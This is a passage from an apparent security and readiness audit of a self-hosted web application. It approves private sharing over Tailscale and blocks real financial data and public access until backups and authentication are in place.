> Authorized for Web Application sharing via `tailscale serve --bg 3001` (HTTPS) while the host machine is kept awake via `caffeinate`. Note: LiveKit Calling will NOT work remotely until `LIVEKIT_URL` is reconfigured (`NO-GO` for calling).

### C. Real Client and Financial Data: `NO-GO`
> **STRICTLY BLOCKED.** Under no circumstances should real financial accounting, bank account numbers, or legally binding client invoices be entrusted to this environment until automated backups, integrity checks, and a verified restore drill are operational on disk.

### D. Public Client Access: `NO-GO`
> **STRICTLY BLOCKED.** Public access must not be enabled. The application has no external authentication or client security perimeter.

---
*Audit completed and signed off independently by Principal Software Architect & Security Lead.*

